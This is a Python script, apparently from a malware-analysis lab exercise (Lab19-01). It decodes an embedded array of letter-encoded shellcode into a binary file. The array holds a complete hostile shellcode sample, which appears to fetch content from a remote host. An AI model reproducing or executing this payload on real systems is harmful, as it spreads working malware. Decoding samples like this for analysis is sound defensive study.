#!/usr/bin/env python3

shellcode = [0x49,0x4A,0x4F,0x46,0x49,0x42,0x4F,0x4D,0x45,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x4F,0x4A,0x44,0x44,0x41,0x42,0x41,0x41,0x41,0x41,0x46,0x47,0x46,0x48,0x49,0x4C,0x48,0x45,0x43,0x45,0x41,0x4D,0x44,0x42,0x50,0x50,0x50,0x4D,0x44,0x42,0x4D,0x41,0x4B,0x4D,0x44,0x49,0x4F,0x41,0x48,0x45,0x41,0x4B,0x4D,0x42,0x4D,0x50,0x41,0x4E,0x41,0x42,0x4D,0x48,0x4F,0x4A,0x4F,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x49,0x4A,0x50,0x49,0x46,0x50,0x46,0x4F,0x4D,0x43,0x41,0x45,0x41,0x41,0x47,0x41,0x49,0x4C,0x47,0x4D,0x43,0x45,0x43,0x45,0x49,0x4C,0x45,0x46,0x44,0x4D,0x49,0x4C,0x46,0x45,0x41,0x46,0x48,0x49,0x41,0x42,0x4F,0x4B,0x49,0x4C,0x45,0x4B,0x42,0x49,0x49,0x4C,0x46,0x4B,0x43,0x41,0x41,0x42,0x4F,0x4C,0x4F,0x44,0x43,0x4B,0x45,0x4A,0x49,0x4C,0x44,0x45,0x49,0x4C,0x41,0x42,0x4F,0x4F,0x46,0x47,0x4F,0x49,0x4C,0x4C,0x50,0x50,0x50,0x50,0x50,0x50,0x44,0x4C,0x45,0x45,0x43,0x45,0x43,0x49,0x48,0x46,0x4F,0x4D,0x49,0x4C,0x46,0x4B,0x43,0x45,0x41,0x42,0x4F,0x4C,0x47,0x47,0x49,0x4C,0x41,0x4D,0x45,0x4C,0x49,0x4C,0x46,0x4B,0x42,0x4D,0x41,0x42,0x4F,0x4C,0x49,0x4C,0x41,0x45,0x49,0x4C,0x41,0x42,0x4F,0x49,0x4F,0x4A,0x41,0x43,0x41,0x41,0x41,0x41,0x41,0x41,0x44,0x42,0x4D,0x41,0x49,0x4A,0x45,0x45,0x43,0x45,0x42,0x4D,0x47,0x42,0x4D,0x43,0x41,0x49,0x41,0x41,0x46,0x47,0x44,0x42,0x4D,0x41,0x47,0x45,0x49,0x4C,0x45,0x41,0x44,0x41,0x49,0x46,0x4D,0x41,0x48,0x49,0x41,0x50,0x49,0x4C,0x45,0x41,0x41,0x4D,0x49,0x4C,0x48,0x41,0x42,0x4D,0x4B,0x4E,0x49,0x4C,0x45,0x41,0x41,0x49,0x4F,0x4A,0x41,0x46,0x41,0x41,0x41,0x41,0x41,0x41,0x4F,0x4A,0x50,0x4C,0x50,0x50,0x50,0x50,0x50,0x50,0x46,0x4F,0x4D,0x44,0x46,0x4C,0x4F,0x49,0x4E,0x4A,0x50,0x50,0x50,0x50,0x50,0x50,0x49,0x4A,0x4D,0x43,0x47,0x49,0x49,0x4F,0x45,0x4F,0x41,0x4F,0x4F,0x4D,0x46,0x43,0x4F,0x49,0x49,0x41,0x50,0x50,0x50,0x50,0x50,0x50,0x49,0x4A,0x45,0x46,0x50,0x4D,0x47,0x49,0x4D,0x42,0x48,0x4A,0x4F,0x46,0x4C,0x49,0x46,0x43,0x4F,0x49,0x48,0x43,0x50,0x50,0x50,0x50,0x50,0x50,0x49,0x4A,0x45,0x46,0x50,0x49,0x47,0x49,0x49,0x44,0x4C,0x4A,0x4C,0x46,0x48,0x49,0x46,0x43,0x4F,0x49,0x47,0x45,0x50,0x50,0x50,0x50,0x50,0x50,0x49,0x4A,0x45,0x46,0x50,0x45,0x47,0x49,0x4F,0x47,0x42,0x48,0x49,0x50,0x48,0x4C,0x46,0x43,0x4F,0x49,0x46,0x47,0x50,0x50,0x50,0x50,0x50,0x50,0x49,0x4A,0x45,0x46,0x50,0x41,0x47,0x49,0x4A,0x49,0x50,0x4F,0x49,0x4B,0x41,0x4F,0x46,0x43,0x4F,0x49,0x45,0x49,0x50,0x50,0x50,0x50,0x50,0x50,0x49,0x4A,0x45,0x46,0x4F,0x4D,0x49,0x4E,0x41,0x44,0x46,0x41,0x50,0x50,0x46,0x46,0x50,0x4D,0x47,0x49,0x44,0x47,0x42,0x4B,0x43,0x50,0x48,0x41,0x46,0x41,0x4F,0x49,0x44,0x45,0x50,0x50,0x50,0x50,0x50,0x50,0x49,0x4A,0x45,0x46,0x4F,0x49,0x47,0x49,0x49,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x49,0x4E,0x48,0x4C,0x45,0x49,0x46,0x48,0x50,0x50,0x46,0x46,0x50,0x49,0x41,0x42,0x4D,0x48,0x4D,0x48,0x41,0x48,0x46,0x4D,0x44,0x42,0x43,0x4F,0x47,0x46,0x4D,0x48,0x45,0x48,0x41,0x45,0x48,0x49,0x47,0x46,0x41,0x41,0x41,0x41,0x44,0x42,0x4D,0x4A,0x46,0x42,0x46,0x42,0x49,0x4E,0x45,0x44,0x45,0x49,0x46,0x41,0x49,0x4E,0x45,0x44,0x41,0x48,0x46,0x41,0x46,0x42,0x50,0x50,0x46,0x46,0x4F,0x49,0x47,0x49,0x41,0x46,0x41,0x41,0x41,0x41,0x41,0x41,0x49,0x4E,0x45,0x44,0x45,0x49,0x46,0x41,0x50,0x50,0x46,0x46,0x4F,0x4D,0x50,0x50,0x46,0x46,0x50,0x41,0x47,0x49,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x46,0x41,0x50,0x50,0x46,0x46,0x50,0x45,0x4F,0x49,0x46,0x47,0x50,0x50,0x50,0x50,0x50,0x50,0x46,0x46,0x46,0x43,0x45,0x4D,0x45,0x4E,0x45,0x50,0x45,0x4F,0x41,0x41,0x47,0x49,0x48,0x45,0x48,0x45,0x48,0x41,0x44,0x4B,0x43,0x50,0x43,0x50,0x48,0x48,0x48,0x48,0x48,0x48,0x43,0x4F,0x48,0x41,0x48,0x43,0x47,0x42,0x47,0x44,0x48,0x45,0x47,0x4A,0x47,0x44,0x47,0x42,0x47,0x4D,0x47,0x4E,0x47,0x42,0x47,0x4D,0x48,0x48,0x47,0x42,0x48,0x43,0x47,0x46,0x47,0x42,0x47,0x4F,0x47,0x42,0x47,0x4D,0x48,0x4A,0x48,0x44,0x47,0x4A,0x48,0x44,0x43,0x4F,0x47,0x44,0x47,0x50,0x47,0x4E,0x43,0x50,0x48,0x44,0x47,0x49,0x47,0x46,0x47,0x4D,0x47,0x4D,0x47,0x44,0x47,0x50,0x47,0x45,0x47,0x46,0x43,0x50,0x47,0x42,0x47,0x4F,0x47,0x4F,0x47,0x50,0x48,0x4A,0x46,0x50,0x48,0x46,0x48,0x44,0x47,0x46,0x48,0x43,0x43,0x4F,0x47,0x46,0x48,0x49,0x47,0x46,0x41,0x41];

decoded_shellcode = [];

esi = 0;
edi = 0;
counter = 0x18D;

	

#for i in range(0,len(shellcode)):
#while(esi < len(shellcode)):
while (counter > 0):
	
	_x = shellcode[esi];
	_x = (_x-0x41) << 4;
	esi+=1;

	_y = shellcode[esi];
	esi+=1;

	decoded_byte = (_y - 0x41) + _x;


	#storing the decoded byte
	#decoded_shellcode.append( "0x%02x" %(decoded_byte) );
	decoded_shellcode.append( "%02x" %(decoded_byte) );
	
	counter -= 1;


#print(decoded_shellcode)
	#writing to a BIN file
for i in decoded_shellcode:
	with open('Lab19-01_shellcode_decoded.bin','ab') as f:
		f.write(bytes.fromhex(i))
	
	
